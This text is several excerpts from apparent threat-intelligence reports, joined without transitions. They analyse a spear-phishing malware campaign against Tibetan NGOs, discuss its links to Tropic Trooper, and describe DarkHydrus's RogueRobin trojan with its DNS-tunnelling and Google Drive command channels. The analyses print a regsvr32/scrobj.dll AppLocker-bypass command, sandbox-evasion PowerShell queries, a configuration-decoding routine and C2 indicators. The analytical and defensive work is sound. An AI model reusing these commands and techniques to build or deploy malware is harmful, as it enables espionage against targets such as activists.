of Tibet (see Figure 5). These files contained the CVE-2017-11882 and TSSL Suite infection chain.\\nFigure 5: Spear phishing email sent to Tibetan activists.\\nOne NGO in particular was heavily targeted and had multiple staff members receive the email. A senior staff member of the group opened the attachment from a computer in their office and was compromised. Through incident response on the organization’s network, we observed post-infection actions taken by the operator and identified the use of a second backdoor.\\nNetwork logs show connections to the IP address 115.126.86[.]151 on ports 6001, 8080, and 8100 matching the configuration file of the TSSL implant. This backdoor was configured to communicate with the C2 server every 20 minutes, but we quickly noticed during the analysis of networks logs that most connections were actually rejected by the C2 server. Based on these patterns, it appears the C2 server was disabled most of the day and active only for short windows.\\nThe TClient sample was used until January 29 when a new backdoor was deployed on the infected system communicating with a new C2 server listed in Table 3. We call the new backdoor “DSNGInstaller”, a name stemming from the payload’s internal name combined with the irony that DSNG is an accepted acronym for Digital Satellite News Gathering. Both backdoors were active until February 8 when the TClient sample was removed.\\nSample\\nMD5\\nDomain\\nIP\\nDSNGInstaller\\n67e866c461c285853b225d2b2c850c4f\\ntibetfrum[.]info\\n27.126.176.169\\nTable 3: C2 configuration for the DSNGInstaller backdoor\\nTable 4 provides an overview of DSNGInstaller’s capabilities (technical details are included in Appendix C).

It is possible the TSSL malware was detected by other targets where we do not have visibility, which caused the operator to shift to a lesser known tool with a lower detection rate. Another possible scenario is that the operator’s interface to the DSNGInstaller tool is more robust and thus preferable for expected long-term access. Finally, it is possible that DSNGIntaller is the tool of choice of another operator. This last scenario would represent a potential handoff of a surveillance victim between multiple remote operators.\\nPart 3: Familiar Connections\\nThis section highlights connections between the Parliamentary and Resurfaced campaigns to an operation called “Tropic Trooper.”\\nCampaign Connections\\nThe tactics, techniques, and procedures used in the Resurfaced Campaign link it to the Parliamentary Campaign and to an operation called “Tropic Trooper”.\\nTrend Micro released the first public report on Tropic Trooper in 2015, describing a malware campaign that targeted government institutions, military agencies, and companies in Taiwan and the Philippines. The campaign exploited old vulnerabilities (CVE-2010-3333 and CVE-2012-0158) and used custom malware, which Trend Micro detects as TROJ_YAHOYAH and BKDR_YAHAMAM. Trend Micro noted that the Yahoyah malware used the same algorithm for encoding configuration files as the 2013 versions of KeyBoy analyzed by Rapid7, suggesting a link between these campaigns or at least the developers of the malware.\\nThe KeyBoy samples that were used in the 2016 Parliamentary Campaign\\xa0had a significant change in the encoding of the configuration file compared to the samples described by Rapid7. In the 2013 version, the configuration file was encoded using a simplified static-key based algorithm. The newer encoding algorithm removed the use of a static encryption key in favour of a dynamically constructed lookup table. The main connection between the Resurfaced Campaign and the Parliamentary Campaign is the reuse of a Yahoo email address (Tibetanparliarnent[@]yahoo.com) to send spear phishing emails to targets in the Tibetan community.\\nMost recently, in 2018 Trend Micro published an update on Tropic Trooper noting a new infection chain that included different exploits (CVE-2017-11882, CVE-2018-0802) and the TSSL tool suite. Amongst the C2 servers observed was a domain (tibetnews[.]today), which shares registrant information with the domains used in the Resurfaced campaign.\\nFigure 6 provides an overview of the connections between these campaigns.\\nFigure 6: Connections between Resurfaced, Parliamentary, and Tropic Trooper campaigns.\\nEvaluating Connections\\nThe relationships between campaigns is typically drawn through the use of common technical indicators (e.g., malware, server infrastructure, etc). In some cases, these links are used to connect multiple campaigns to a “threat actor” or “group” which is thought to be carrying out the campaigns. These links can have varying levels of strength, which can lead to different levels of confidence in attributing campaigns to a specific actor (see Table 5).\\nConnection Type\\nDescription\\nFirst-order connections\\nShared tools and infrastructure that are directly observed being used against targets.\\nThese connections typically form the core indicators or “problem set” of a campaign.\\nSecond-order connections\\nRelated samples of tools believed to be unique or C2 infrastructure overlaps where neither the tools or infrastructure were directly observed in use.\\nNth-order connections\\nUnique characteristics of tools and infrastructure such as code reuse, development techniques, or naming conventions.\\nTable 5: Overview of connection types and level of confidence.\\nFirst-order connections typically require direct observation of malicious activity against a target and as a result may not be made public (for example, if a security company obtains the data from a customer). By contrast, second and Nth-order connections can usually be normalized between researchers and used to make connections between campaigns. For example, Kaspersky labelled a reportedly China-based threat group as Winnti after a tool they used. Over time, different campaigns and tools were grouped under the same name, for instance, Microsoft associated Winnti with multiple groups they name “BARIUM” and “LEAD”. While these differences in groupings stem from differing first-order connections, enough second and Nth-order connections have been identified to reference the collection of indicators as an umbrella of “Winnti” activities, which ProtectWise recently did in a report. In these cases, indicators are available, but the strength of the connections may not be readily apparent and can lead to very wide groupings and abstractions.\\nFor Tropic Trooper, multiple security companies have released information that they claim link campaigns to the threat actor. The strength of the evidence behind these claims is not always clear but the majority appear to be second and/or Nth-order connections. Table 6 and Figure 7 detail the connections made in these reports.\\nReport\\nDescription\\nTropic Trooper Connection\\nConnection Type\\nPalo Alto (2016)\\nCampaign using Yahoyah, PcShare, and Poison Ivy targeting Taiwanese government and fossil fuel provider\\nUse of Yahoyah malware\\nOverlapping C2 infrastructure\\nSecond-order, possibly first-order\\nLookout (2017)\\nDescription of Android malware called Titan\\nOverlapping C2 infrastructure\\nSecond-order\\nTrend Micro (2018)\\nCampaign using TSSL toolkit targeting government and industry in Taiwan, Philippines, and Hong Kong.\\nTSSL toolkit\\nUnknown*\\nTable 6: Overview of reports connecting malware campaigns to Tropic Trooper\\xa0\\xa0*Note: This report is the first time TSSL toolkit is linked to Tropic Trooper. Trend Micro does not explain how they made the connection.\\nFigure 7: Connections between reports linking campaigns and malware to Tropic Trooper.\\nPart 4: Challenges of Analyzing Closed Ecosystems\\nThis section discusses challenges in investigating closed espionage ecosystems and situates our investigation within wider trends of digital espionage operations against the Tibetan diaspora.\\nThe Resurfaced Campaign used a mix of new and previously-observed tools, which share technical characteristics with campaigns previously attributed to Tropic Trooper. However, these links alone do not allow us to conclusively state that the campaigns are run by the same actor. This ambiguity illustrates some of the analytical challenges posed when analyzing connections between campaigns and theorizing about the roles of different actors in closed espionage ecosystems.\\nResearchers need to use naming schemes and actor grouping to characterize digital espionage operations out of necessity. While names are critical, the process by which they are selected, as Florian Roth and others have pointed out, can lead to to multiple names for the same group and potential confusion over what a name refers to. Differentiating between campaigns and the “threat actor” behind Tropic Trooper shows some of these challenges. Reports on Tropic Trooper have characterized it in varied and sometimes ambiguous ways (see Table 7). This variation points to some of the challenges inherent in consistently using naming: do names refer to campaigns of malware activity, the “threat actors” behind them, or a common tool set? It is not always clear.\\nReport\\nDescription\\nTrend Micro (2015)\\n“‘…Operation Tropic Trooper,’ an ongoing campaign…”\\nPalo Alto (2016)\\n“…a campaign called Tropic Trooper,…”\\nLookout (2017)\\n“…linked to the same actors behind Operation Tropic Trooper. Tropic Trooper is a long running campaign…”\\nTrend Micro (2018)\\n“Tropic Trooper (also known as KeyBoy) levels its campaigns against … targets”\\nTable 7: Descriptions of Tropic Trooper in previous reports.\\nPart of the complexity of naming stems from the multiple operational roles likely to be present in a major campaign. These roles may include malware developers, campaign operators, and intelligence taskers and consumers. The relationships between these roles may be simple or multi-layered. For example, a developer may double as an operator for a small task for a customer. Malware developers may share tools with multiple operators acting independently from each other. Customers may be active (i.e., directly involved in tasking operators) or passive (i.e., consuming information brought to them by the operators or brokers representing the operators). Unfortunately, in the case of the Resurfaced Campaign, we lack the visibility into the organizational roles that would help us move from what we have observed to a more conclusive statement about its relationship to Tropic Trooper. Meanwhile, an operator may use the same tools to work on multiple tasks for multiple consumers. These complexities can create challenges when tools and infrastructure are the primary means for identifying and linking campaign activities.\\nReviewing the timeline of malware and infrastructure development in the Resurfaced Campaign illustrates these challenges. Figure 8 shows that while the infrastructure was setup months before the first spear phishing messages were sent, the malware builds were all done shortly before the campaign started. The time difference between infrastructure setup and malware build combined with the fact that our identified connections to Tropic Trooper are only code-based suggest that the malware may be a resource that is shared between groups.\\nFigure 8: Resurfaced Campaign Malware and Infrastructure Development Timeline.\\nThe connections between the Resurfaced and Parliamentary Campaigns to Tropic Trooper highlight the difficulties of characterizing threat groups and how they interact with other players in a closed espionage ecosystem. While the campaigns are linked by shared tools and infrastructure (Nth-order connections), based on this information alone we cannot conclusively say that these activities are being conducted by a single group. Campaigns labelled as Tropic Trooper also have targeted a range of government, industry, and civil society targets, which may indicate multiple intelligence consumers.\\nA View into Closed Espionage Ecosystems\\nAlthough the relationship between developers, operators, and the final intelligence consumer is often unclear, recent indictments issued by the United States Department of Justice (DOJ) against espionage groups based in China provide a glimpse into how these groups interact.\\nIn 2014, the DOJ charged five officers of the People’s Liberation Army with economic espionage offences. These officers are allegedly part of a threat group known as APT1, which Mandiant first identified as part of the 2nd Bureau of the People’s Liberation Army General Staff Department’s 3rd Department. APT1 targeted numerous government and Fortune 500 companies, but was also found by Citizen Lab to have targeted Tibetan activists and a large international NGO. According to the indictment, the intelligence consumers that APT1 serviced included the Chinese government and Chinese firms seeking intellectual property and information on competitors.\\nIn another 2014 case, the DOJ charged a Chinese national named Su Bin with participating in a long term conspiracy to compromise major U.S. defense contractors and sell stolen information on technology projects to entities in China. Su Bin worked with two unnamed conspirators who carried out the the intrusions. The indictment identified the conspirators as being located in China and related to “multiple organizations and entities in the PRC”. The conspirators received 2.2 million RMB (approximately $332,040 USD) to build up their operation, but the total cost of the activity was 6.8 million RMB (approximately $995,400 USD). The conspirators shared a report with each other that detailed targets, objectives, and successes of an intrusion operation against one of their targets. The report included a description of “past achievements” including stealing files from the “democracy movement” (a reference to democracy activists in Hong Kong) and the “Tibetan independence movement”.\\nThese cases offer rare glimpses into the interactions between developers, operators, and intelligence consumers showing that the same million-dollar programs funded to conduct economic espionage operations may also incentivize the targeting of civil society organizations. While the first type of operation may result in loss of intellectual property and financial loss, the second might result in direct harm to targeted individuals or their families.\\nAddressing the analytical challenges\\nSecurity researchers typically do not have the level of evidence and visibility cited in the DOJ indictments and have to rely on available technical indicators to track groups and hypothesize their motivations and role within closed espionage ecosystems. A possible area for future work is using formal methods (i.e., mathematical techniques developed in computer science to describe properties of hardware and software systems) to connect technical indicators and link campaigns. Such techniques may provide a more systematic way to link groups together and alleviate ambiguity. However, as we have discussed, identification of operators and malware developers is only one piece of the puzzle. Gaining an understanding of the ultimate harm of digital espionage requires interacting with targeted communities.\\nShowing Harm: Perspectives from Civil Society\\nDigital espionage has become a commonplace threat for the Tibetan diaspora. Digital security awareness and best practices for defense are now necessities for the community. Based on this experience, for Tibetans the harm of espionage operations is clear. Lobsang Gyatso Sither, a Tibetan digital security trainer, provides a perspective:\\n“It’s important for the community to get away from the mindset of “I have nothing to hide” and think about the connections between us and how these can lead to harm. Tibetans in Exile are connected to each other through various organizations and contacts. If you are compromised, you become the weakest link, and allow the spies to get information that can be used to target other Tibetans. Tibetans in Exile are also constantly in touch with Tibetans inside Tibet, where the harms can be severe – including arrest, detention, and imprisonment.”\\nIn recent years, we have seen operators shift tactics to basic credential phishing, making the Resurfaced Campaign notable for being the first instance of a malware campaign targeting the community we have seen since 2016. The campaign used familiar tactics of clever social engineering combined with custom malware. In response to the persistent threat of digital espionage, Tibetan groups have launched grassroots efforts to increase digital security education, but changing behaviour and building capacity requires time and patience. At least one organization was compromised by the Resurfaced Campaign, which shows that familiar tactics are still being used because they still work. However, rather than being dissuaded by these threats, Tibetans are continuing the hard and necessary work to empower their community and defend against digital espionage.\\nAcknowledgements\\nAuthors listed in alphabetical order.

This script decodes the base64 encoded DMShell++ script and executes it.\\nA PowerShell script dropped by the binary 11e0f3e1c7d8855ed7f1dcfce4b7702a during the execution of CVE-2017-11882. This PowerShell script decodes the base64 encoded payload stored in %TEMP%\\\\pfine and executes the DMShell++ payload.\\nPayload\\nDMShell++ is a reverse TCP backdoor written in PowerShell. It uses PowerShell System.Net.Sockets to create three TCP streams, one to each C2 address hardcoded in a PowerShell object:\\nWhen a TCP stream is started, it first calls the function SendLoginInfo, which sends information about the system to the C2 server, under the form TOKEN|*|IP ADDRESS|*|WINDOWS VERSION|*|USER NAME. For example, on a virtual machine we used for testing, the following packet was sent to the C2 server:\\nOnce this first packet is sent, the script enters into an endless loop waiting for commands from the C2 servers. The same delimiter |*| is again used and the script accepts four different commands:\\nCMD: executes the shell command and returns the output<\\nFILERECEIVE: send the file at the given path\\nFILEHEAD: receive information from a file to be downloaded from the C2 server. Data is received under the format FILEHEAD|*|FILENAME|FILEEXTENSION|FILESIZE\\nFILESEND: receive data stream from the file\\nAppendix B: TSSL Code Differences\\nDuring the course of our investigation, we identified malware that is similar to malware in the TSSL suite described by Trend Micro in their 2018 Tropic Trooper report. This appendix describes the code differences between these two versions for both the FakeRun loader and the TClient payload of the TSSL suite.\\nComparing the InstallClient malware samples we found and those described by Trend Micro show slight modifications. Both samples followed the same behavior path to install their payloads and setup persistence with the main difference being the installation of their configuration information. The TrendMicro sample installed its configuration as an encrypted file while our sample stored its configuration as an encrypted and base64 encoded string in a Windows registry key. In addition, the TrendMicro sample dropped its FakeRun sample with the sidebar.exe while our sample dropped the Windows wab32.exe binary to act as the loading program for its FakeRun sample. The FakeRun samples we compared performed the same series of actions to spawn the final payload with differences being made to adjust for the binary names, config locations, etc.\\nOur TClient sample appeared to be an older, less feature-rich version of the TClient reported by Trend Micro. Both samples appeared to report what seemed to be a version number as part of their initial C2 communication. Trend Micro’s sample reported a version number of 3.2.2.5 and our sample reported a version number of 0.1.4. Based on the similarities between the samples, we assess that the two campaigns use malware from the same codebase, possibly forked at some point in the past. Based on the compile times of each sample, we analysed it appears that our samples were compiled approximately two hours after those detailed by Trend Micro.\\nThe list of functionality common to both TClient samples includes:\\nGet OS and user information\\nOpen a backdoor shell\\nRun commands on an open backdoor shell\\nRestart the machine\\nUninstall the malware\\nList drives and devices\\nManipulate files and directories\\nUpload/Download files from the C2 server\\nReport the current configuration settings\\nThe Trend Micro TClient sample added the following functionality:\\nLookup the victim’s IP address via myip.com[.]tw\\nList/Kill running processes\\nList installed programs\\nModify file timestamps\\nTake screenshots\\nUpdate the configuration settings\\nAppendix C: DSNG Installer\\nLoader\\nDSNGInstaller was discovered on a compromised system as osun.dll. It maintained persistence via a CurrentVersion\\\\Run registry key. The install location folder also contained a file which had logs from a keylogger. The loader stores configuration information as encrypted data in the binary itself and the final payload as a resource in PPKK. The payload is encrypted with the blowfish cipher in ECB mode while the configuration is dropped and then decrypted by the payload. The loader also contains code to gain persistence via the creation of a Windows service: KCOM Server Security Guard, though this was not used in the sample we discovered.\\nPayload\\nThe payload is a simple RAT that provides a limited number of capabilities to an operator. It can be started in one of two ways: either with or without provided configuration options. The sample we discovered was passed configuration options at start as arguments to one of its exported functions. This configuration information is passed to the RAT in an encrypted form using the following algorithm:\\nn = 0\\nwhile n < data_len:\\ni = data[n++] ^ 0x5\\ndata[n - 1] = i\\nif n >= data_len:\\nbreak\\nj = data[n++] ^ 0x27\\ndata[n - 1] = j\\nA portion of the decrypted configuration used in the sample we discovered can be seen in the figure below:\\nNetwork Communication\\nDSNGInstaller uses a simple network communication protocol when connecting to its C2 server, which consists of a short header followed by a payload encrypted with the same algorithm used to encrypt and decrypt the RAT’s configuration. The header is defined as:\\nHeader {\\nid: [u8; 16]\\nuuid: [char, 16]\\nipv4: [char, 16]\\nlength: u32\\ncommand: u8\\ncommand_successful: u8\\nid: [char; 16]\\n}\\nThe \"id” is defined in the passed configuration, “uuid” is a uuid generated using the Windows API function UuidCreateSequential, and “ipv4” is the IPv4 address of the infected machine. “length” is the length in bytes of the full message sent to the C2 server. “command” and “command_successful” are only used when sending or replying to a command from the C2 server. They correspond to the number used to identify a command and a Boolean value reporting the success or failure of a given command. “id” is a character string that is \"693\" for our sample, which leads us to believe this may be a campaign or victim identifier but we do not know for certain what its exact use is. Following the header is the encrypted payload of the C2 communication.\\nWe also discovered code to proxy all of DSNGInstaller network communication over HTTP, with and without user credentials. However, this functionality did not appear to be used anywhere by the malware. It appears to be an artifact of additional development work that was either unused or incomplete when the malware was deployed.\\nAppendix D: Server Infrastructure\\nThe server infrastructure that we observed in the campaign is listed in the table below:\\nSamples\\nDomains\\nIPs\\nCVE-2017-0199\\ncommail[.]co\\ntibetnews[.]info\\ncomemails[.]email\\n27.126.186.222\\n103.55.24.196\\n203.189.232.207\\nDMShell++\\n27.126.186.222\\n103.55.24.196\\n45.127.97.222\\n203.189.232.207\\n103.55.24.196\\nDMShell++ backdoor\\n27.126.186.222\\nTSSL Backdoor\\ntibetnews[.]today\\n115.126.86.151\\nThe majority of these domains (with the exception of comemails[.]email) share the same whois registration information:\\nName: huang ning\\nEmail: bqfkdrmnhh0623[@]gmail.com\\nPhone number: 8677687877\\nFurther searches on this whois information revealed an additional three domains with the same registration information:\\nDomain\\nRegistrar\\nCreation Date\\ntibethouse[.]info\\nGoDaddy\\n2018-01-03\\ndaynew[.]today\\nGoDaddy\\n2017-12-27\\ndaynews[.]today\\nGoDaddy\\n2017-12-27\\nWe found 12 SSL certificates that were created for these domains.

This group was observed using tactics such as registering typosquatting domains for security or technology vendors, abusing open-source penetration testing tools, and leveraging novel file types as anti-analysis techniques.\\nSince that initial reporting, we had not observed new activity from DarkHydrus until recently, when 360TIC published a tweet and subsequent research discussing delivery documents that appeared to be attributed to DarkHydrus. In the process of analyzing the delivery documents, we were able to collect additional associated samples, uncover additional functionality of the payloads including the use of Google Drive API, and confirm the strong likelihood of attribution to DarkHydrus. We have notified Google of our findings.\\nDelivery Document\\nWe collected a total of three DarkHydrus delivery documents installing a new variant of the RogueRobin trojan. These three documents were extremely similar to each other and are all macro enabled Excel documents with .xlsm file extensions. None of the known documents contain a lure image or message to instruct the recipient to click the Enable Content button necessary to run the macro, as seen in Figure 1. While we cannot confirm the delivery mechanism, it is likely that the instructions to click the Enable Content button were provided during delivery, such as in the body of a spear-phishing email.\\nFigure 1 DarkHydrus’ delivery document does not have a lure image or message\\nWithout the delivery mechanism we cannot confirm the exact time these delivery documents were used in an attack; however, the observed timestamps within these three delivery documents gives us an idea when the DarkHydrus actors created them. While the creation times were timestomped to a default time of 2006-09-16 00:00:00Z commonly observed in malicious documents, the Last Modified times were still available and suggest that DarkHydrus created these documents in December 2018 and January 2019. Table 1 shows the breakdown of timestamps and their associated sample hashes.\\nSHA256\\nLast Modified\\ne068c6536bf353abe249ad0464c58fb85d7de25223442dd220d64116dbf1e022\\n2018-12-15T05:14:32Z\\n4e40f80114e5bd44a762f6066a3e56ccdc0d01ab2a18397ea12e0bc5508215b8\\n2018-12-23T05:45:43Z\\n513813af1590bc9edeb91845b454d42bbce6a5e2d43a9b0afa7692e4e500b4c8\\n2019-01-08T06:51:21Z\\nTable 1 Timestamps of delivery documents\\nThe macro executes immediately after pressing the Enable Content button thanks to the\\xa0 Workbook_Open sub-function, which will call the actor created New_Macro function. The New_Macro function starts by concatenating several strings to create a PowerShell script that it will write to the file %TEMP%\\\\WINDOWSTEMP.ps1. The function builds the contents of a second file by concatenating several strings together, but this second file is a .sct file that the function will write to a file %TEMP%\\\\12-B-366.txt. While .sct files are used by a multitude of applications, in this instance it is being used as a Windows Script Component file. The function then uses the built-in Shell function to run the following command, which effectively executes the .sct file stored in 12-B-366.txt:\\nregsvr32.exe /s /n /u /i:%TEMP%\\\\12-B-366.txt scrobj.dll\\n1\\nregsvr32.exe /s /n /u /i:%TEMP%\\\\12-B-366.txt scrobj.dll\\nThe use of the legitimate regsvr32.exe application to run a .sct file is an AppLocker bypass technique originally discovered by Casey Smith (@subtee), which eventually resulted in a Metasploit module. The WINDOWSTEMP.ps1 script is a dropper that decodes an embedded executable using base64 and decompresses it with the System.IO.Compression.GzipStream object. The script saves the decoded and decompressed executable to %APPDATA%\\\\Microsoft\\\\Windows\\\\Templates\\\\WindowsTemplate.exe and creates an LNK shortcut at %APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\OneDrive.lnk to persistently run WindowsTemplate.exe each time Windows starts up. The WindowsTemplate.exe executable is a new variant of RogueRobin written in C#.\\nRogueRobin .NET Payload\\nIn our original blog on DarkHydrus, we analyzed a PowerShell-based payload we named RogueRobin. While performing the analysis on the delivery documents using the .sct file AppLocker bypass, we noticed the C# payload was functionally similar to the original RogueRobin payload. The similarities between the PowerShell and C# variants of RogueRobin suggests that the DarkHydrus group ported their code to a compiled variant.\\nThe C# variant of RogueRobin attempts to detect if it is executing in a sandbox environment using the same commands as in the PowerShell variant of RogueRobin. The series of commands, as seen in Table 2, include checks for virtualized environments, low memory, and processor counts, in addition to checks for common analysis tools running on the system. The Trojan also checks to see if a debugger is attached to its processes and will exit if it detects the presence of a debugger.\\nPowerShell command\\nDescription\\n‘gwmi -query “select * from win32_BIOS where SMBIOSBIOSVERSION LIKE ‘%VBOX%'”\\nQuery attempts to detect VirtualBox environment from the win32_BIOS WMI class\\ngwmi -query “select * from win32_BIOS where SMBIOSBIOSVERSION LIKE ‘%bochs%'”\\nQuery attempts to detect Bochs environment from the win32_BIOS WMI class\\ngwmi -query “select * from win32_BIOS where SMBIOSBIOSVERSION LIKE ‘%qemu%'”\\nQuery attempts to detect QEMU environment from the win32_BIOS WMI class\\ngwmi -query “select * from win32_BIOS where SMBIOSBIOSVERSION LIKE ‘%VirtualBox%'”\\nQuery attempts to detect VirtualBox environment from the win32_BIOS WMI class\\ngwmi -query “select * from win32_BIOS where SMBIOSBIOSVERSION LIKE ‘%VM%'”\\nQuery attempts to detect VMWare environment from the win32_BIOS WMI class\\ngwmi -query “Select * from win32_BIOS where Manufacturer LIKE ‘%XEN%'”\\nQuery attempts to detect Xen environment from the win32_BIOS WMI class\\ngwmi win32_computersystem\\nUses this query to check the system information for the string “VMware”.\\ngwmi -query “Select TotalPhysicalMemory from Win32_ComputerSystem”\\nUses this query to check to see if the total physical memory is less than 2,900,000,000 bytes.\\ngwmi -Class win32_Processor | select NumberOfCores\\nUses this query to check to see if the total number of CPU cores is less than 1.\\nGet-Process | select Company\\nChecks to see if any running processes have “Wireshark” or “Sysinternals” as the company name.\\nTable 2 Sandbox evasion checks in the C# variant of RogueRobin\\nLike the original version, the C# variant of RogueRobin uses DNS tunneling to communicate with its C2 server using a variety of different DNS query types. Just like in the sandbox checks, the Trojan checks for an attached debugger each time it issues a DNS query; if it does detect a debugger it will issue a DNS query to resolve 676f6f646c75636b.gogle[.]co. The domain is legitimate and owned by Google. The subdomain 676f6f646c75636b is a hex encoded string which decodes to goodluck. This DNS query likely exists as a note to researchers or possibly as an anti-analysis measure, as it will only trigger if the researcher has already patched the initial debugger check to move onto the C2 function. Figure 2 shows the code responsible for detecting the attached debugger and issuing the corresponding DNS request.\\nFigure 2 Code that issues DNS query to gogle.co if a debugger is detected\\nAll DNS requests issued by RogueRobin use the built in nslookup.exe application to communicate to the C2 server and the Trojan will use a variety of regular expressions to extract data from the DNS response. Firstly, the Trojan will use the following regular expression to determine if the C2 server wishes to cancel the C2 communications:\\n216.58.192.174|2a00:1450:4001:81a::200e|2200::|download.microsoft.com|ntservicepack.microsoft.com|windowsupdate.microsoft.com|update.microsoft.com\\n1\\n216.58.192.174|2a00:1450:4001:81a::200e|2200::|download.microsoft.com|ntservicepack.microsoft.com|windowsupdate.microsoft.com|update.microsoft.com\\nAdditionally, the RogueRobin Trojan uses the regular expressions in Table 3 to confirm that the DNS response contains the appropriate data for it to extract information from.\\nRegular Expressions\\n([^r-v\\\\\\\\s])[r-v]([\\\\\\\\w\\\\\\\\d+\\\\\\\\/=]+)-\\\\\\\\w+.(<domainList[0]>|<domainList[1]>|<domainList[n]>)\\nAddress:\\\\\\\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\\\\\\\w|:]+){1,8})\\nAddress:\\\\\\\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})\\n([^r-v\\\\\\\\s]+)[r-v]([\\\\\\\\w\\\\\\\\d+\\\\\\\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)\\n(\\\\\\\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)\\nAddress:\\\\\\\\s+(\\\\\\\\d+.\\\\\\\\d+.\\\\\\\\d+.\\\\\\\\d+)\\nTable 3 Regular expressions used by RogueRobin\\nThe C# variant, like its PowerShell relative, will issue DNS queries to determine which query types can successfully communicate with its C2 servers. Figure 3 shows the RogueRobin payload issuing DNS requests to resolve custom crafted subdomains of its C2 domains using TXT, SOA, MX, CNAME, SRV, A and AAAA query types.\\nFigure 3 RogueRobin testing various DNS query types\\nThe domains in the test queries, such as aqhpc.akdns[.]live have subdomains that are generated by substituting the digits in the Trojan’s process ID with characters seen in Table 4 (for example qhp for the PID 908) and surrounding these characters with the static characters a and c. The C2 server can respond to any of the query types to provide a unique identifier value that the Trojan will store in a variable and use in future DNS requests.\\nCharacter\\nDigit\\nh\\n0\\ni\\n1\\nj\\n2\\nk\\n3\\nl\\n4\\nm\\n5\\nn\\n6\\no\\n7\\np\\n8\\nq\\n9\\nTable 4 Character substitution used in RogueRobin\\nThe Trojan will use future DNS requests to retrieve jobs from the C2 server, which the Trojan will handle as commands. To obtain a job, the Trojan builds a subdomain that has the following structure and issues a DNS query to the C2 server:\\nc<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c\\nThe generated subdomain is then subjected to a number-to-character substitution function that is the inverse of the Table 4, which effectively converts all the digits in the subdomain into characters. The Trojan checks the response to this query using the regular expressions in Table 3. If it received a non-cancelling response, the Trojan will extract data from the DNS responses and treat it as commands. Table 5 shows the commands that the C# variant of RogueRobin can handle, which is extremely similar to the previously analyzed PowerShell variant.\\nRegex\\nDescription\\n^kill\\nKills a thread running in Trojan based on a provided thread name\\n^\\\\$fileDownload\\nUploads a file to the C2 server via the DNS tunnel\\n^\\\\$importModule\\nRuns a provided PowerShell command and adds it to a list called ‘modules’\\n^\\\\$x_mode\\nTurns on the alternative mode of ‘x_mode’ on to use the alternative C2 channel.

This command is particularly interesting as it enables an alternative command and control channel that uses the Google Drive API. The x_mode command is disabled by default, but when enabled via a command received from the DNS tunneling channel, it allows RogueRobin to receive a unique identifier and to get jobs by using Google Drive API requests.\\nIn x_mode, RogueRobin uploads a file to the Google Drive account and continually checks the file’s modification time to see if the actor has made any changes to it. The actor will first modify the file to include a unique identifier that the Trojan will use for future communications. The Trojan will treat all subsequent changes to the file made by the actor as jobs and will treat them as commands, which it will handle with the same command handler seen in Table 5.\\nTo use Google Drive, the x_mode command received from the C2 server via DNS tunneling will be followed by a newline-delimited list of settings needed to interact with the Google Drive account. Figure 4 shows the code in RogueRobin that handles the x_mode command, specifically splitting the command data on newlines and using the resulting array to set variables used as x_mode settings.\\nFigure 4 x_mode command and new line delimited settings\\nAs seen in Figure 4, the settings are stored in variables seen in Table 6, which are used to authenticate to the actor-controlled Google account before uploading and downloading files from Google Drive.\\nVariable Name\\nDescription\\ngdu\\nGoogle Drive URL for downloading files to the Google Drive account\\ngduu\\nGoogle Drive URL for uploading files to the Google Drive account\\ngdue\\nGoogle Drive URL for updating a file on the Google Drive account\\ngdo2t\\nGoogle Drive URL used to get the OAUTH access_token\\nclient_id\\nThe client_id for the OAUTH application\\ncs\\nThe client_secret for OAUTH\\nr_t\\nThe refresh_token for OAUTH\\nTable 6 Variables used to store settings needed to use Google Drive as a C2\\nTo obtain an OAUTH access token to authenticate to the actor provided Google account, the Trojan sends an HTTP POST request to a URL stored in the gdo2t variable with grant_type, client_id, client_secret, and refresh_token fields added to the HTTP header and in the POST data. As seen in Figure 5, the values for these fields are set to variables initially set upon issuing of the x_mode command.\\nFigure 5 HTTP POST request to obtain an OAUTH access token\\nFigure 5 shows that the Trojan then uses the following regular expression to obtain the access token from the HTTP response:\\n\\\\”access_token\\\\”:(.*)\\nOnce authenticated with a valid access token, the Trojan will attempt to upload a file to the Google Drive account. To upload a file, the Trojan first creates an HTTP POST request to the URL stored in gduu to send the following JSON data to the Google Drive account:\\n{ “name” : “<process ID of Trojan>.txt” }\\nGoogle Drive will respond to this request with an HTTP response whose header contains a Location field. This field contains a URL that the Trojan will use to upload the contents of the <process ID of Trojan>.txt file, which will be structured as <process ID of Trojan>.<C2 domain> where the process ID is encoded with the same character substitution function as seen previously in Table 4. The Trojan will then use the following regular expression to check the HTTP response to the content upload request for the file identifier value:\\n\\\\”id\\\\”:(.*)\\nThe Trojan will use this file identifier value to monitor for changes made to the file by the actor by checking for changes to the modification time of the <process ID of Trojan>.txt file. The Trojan checks the modified time of the file by creating an HTTP request to a URL structured as follows:\\n<Google Drive URL in ‘gdu’> + <file identifier> + “?supportTeamDrives=true&fields=modifiedTime”\\nThe Trojan then uses the following regular expression to obtain the modified time of the file from the HTTP response, which is saved to the variable named modification_time:\\n\\\\”modifiedTime\\\\”:(.*)\\nThe Trojan then uploads a second file to the Google Drive, the purpose of which is to allow the Trojan to continually write to this file as it waits for the actor to modify the first file uploaded. The Trojan will write <process ID of Trojan> to a second file stored on the Google Drive instance named <process ID of Trojan>-U.txt. In each iteration of the communications loop, the Trojan will check to see if the modification time of the first file changed, and if it is not updated the Trojan will update the second file by writing the string b<unique identifier>c<5 random lowercase characters>.<C2 domain> to the file by creating an HTTP POST request to a URL structured as follows:\\n<Google Drive URL in ‘gdue’> + <second file identifier> + “?supportsTeamDrive=true&uploadType=resumable&fields=kind,id,name,mimeType,parents”\\nIn one RogueRobin sample (SHA256: f1b2bc0831…), the author did not use the Google Drive URL provided by the actor when issuing the x_mode command, and instead included a \\xa0hardcoded Google Drive URL, as seen in Figure 6. This is the only instance we observed where a hardcoded Google Drive URL was included in RogueRobin, which may suggest that the author may have overlooked this during testing.\\nFigure 6 Hardcoded Google Drive URL used in RogueRobin sample\\nWhen the modification_time for the first file changes, the Trojan downloads the contents from the first file uploaded to the Google Drive. The Trojan downloads the contents of this file by crafting an HTTP request to a URL structured as follows:\\n<Google Drive URL in ‘gdu’> + <first file identifier> + “?alt=media”\\nWith the contents of the file downloaded, the Trojan sets the modification_time variable to the current modification time so the Trojan knows when the actor makes further changes to the file. The Trojan processes the downloaded data the same way it would for a unique identifier as if the data was obtained via the DNS tunneling 